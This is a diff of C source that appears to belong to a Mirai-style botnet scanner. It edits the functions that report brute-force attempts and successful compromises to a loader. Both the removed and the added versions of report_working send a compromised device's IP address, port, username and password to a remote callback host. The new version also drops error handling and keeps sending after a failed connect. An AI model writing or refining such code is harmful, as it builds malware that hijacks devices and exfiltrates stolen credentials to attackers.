@@ -1315,8 +1315,7 @@ static void report_brute_attempt(ipv4_t daddr, uint16_t dport)
     }
     
     SCANNER_DEBUG_LOG("Successfully connected to scanner callback for brute attempt");
-    SCANNER_DEBUG_LOG("Reporting brute force attempt for IP: %d.%d.%d.%d:%d", 
-        daddr & 0xff, (daddr >> 8) & 0xff, (daddr >> 16) & 0xff, (daddr >> 24) & 0xff, ntohs(dport));
+    SCANNER_DEBUG_LOG("Reporting brute force attempt for IP: %s:%d", inet_ntoa(daddr), ntohs(dport));
 
     // Send brute attempt report (different from successful compromise)
     uint8_t brute_flag = 1;  // Flag to indicate this is a brute attempt, not success
@@ -1357,8 +1356,7 @@ static void report_brute_attempt(ipv4_t daddr, uint16_t dport)
         return;
     }
     
-    SCANNER_DEBUG_LOG("Successfully sent brute force report for %d.%d.%d.%d:%d", 
-        daddr & 0xff, (daddr >> 8) & 0xff, (daddr >> 16) & 0xff, (daddr >> 24) & 0xff, ntohs(dport));
+    SCANNER_DEBUG_LOG("Successfully sent brute force report for %s:%d", inet_ntoa(daddr), ntohs(dport));
     
     // Wait a moment for scanListen to process the data
     usleep(100000);  // 100ms delay
@@ -1418,70 +1416,20 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
 
     if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
     {
-        SCANNER_DEBUG_LOG("Failed to connect to scanner callback for successful compromise: %s", strerror(errno));
+#ifdef DEBUG
+        printf("[report] Failed to connect to scanner callback!\n");
+#endif
         close(fd);
-        return;
     }
-
-    SCANNER_DEBUG_LOG("Successfully connected to scanner callback for successful compromise");
-    SCANNER_DEBUG_LOG("Reporting successful compromise for IP: %d.%d.%d.%d:%d with auth %s:%s", 
-        daddr & 0xff, (daddr >> 8) & 0xff, (daddr >> 16) & 0xff, (daddr >> 24) & 0xff, ntohs(dport), auth->username, auth->password);
 
     uint8_t zero = 0;
-    if (send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL) == -1)
-    {
-        SCANNER_DEBUG_LOG("Failed to send success flag: %s", strerror(errno));
-        close(fd);
-        return;
-    }
-    
-    if (send(fd, &daddr, sizeof (ipv4_t), MSG_NOSIGNAL) == -1)
-    {
-        SCANNER_DEBUG_LOG("Failed to send IP address: %s", strerror(errno));
-        close(fd);
-        return;
-    }
-    
-    if (send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL) == -1)
-    {
-        SCANNER_DEBUG_LOG("Failed to send port: %s", strerror(errno));
-        close(fd);
-        return;
-    }
-    
-    if (send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL) == -1)
-    {
-        SCANNER_DEBUG_LOG("Failed to send username length: %s", strerror(errno));
-        close(fd);
-        return;
-    }
-    
-    if (send(fd, auth->username, auth->username_len, MSG_NOSIGNAL) == -1)
-    {
-        SCANNER_DEBUG_LOG("Failed to send username: %s", strerror(errno));
-        close(fd);
-        return;
-    }
-    
-    if (send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL) == -1)
-    {
-        SCANNER_DEBUG_LOG("Failed to send password length: %s", strerror(errno));
-        close(fd);
-        return;
-    }
-    
-    if (send(fd, auth->password, auth->password_len, MSG_NOSIGNAL) == -1)
-    {
-        SCANNER_DEBUG_LOG("Failed to send password: %s", strerror(errno));
-        close(fd);
-        return;
-    }
-
-    SCANNER_DEBUG_LOG("Successfully sent successful compromise report for %d.%d.%d.%d:%d", 
-        daddr & 0xff, (daddr >> 8) & 0xff, (daddr >> 16) & 0xff, (daddr >> 24) & 0xff, ntohs(dport));
-    
-    // Wait a moment for scanListen to process the data
-    usleep(100000);  // 100ms delay
+    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);
+    send(fd, &daddr, sizeof (ipv4_t), MSG_NOSIGNAL);
+    send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
+    send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);
+    send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
+    send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL);
+    send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);
 
 #ifdef DEBUG
     printf("[report] Send scan result to loader\n");
@@ -1513,7 +1461,7 @@ static char *deobf(char *str, int *len)
 
 static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
 {
-    uint8_t *end = (uint8_t *)conn->rdbuf + conn->rdbuf_pos;
+    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;
 
     return ptr + amount < end;
 }
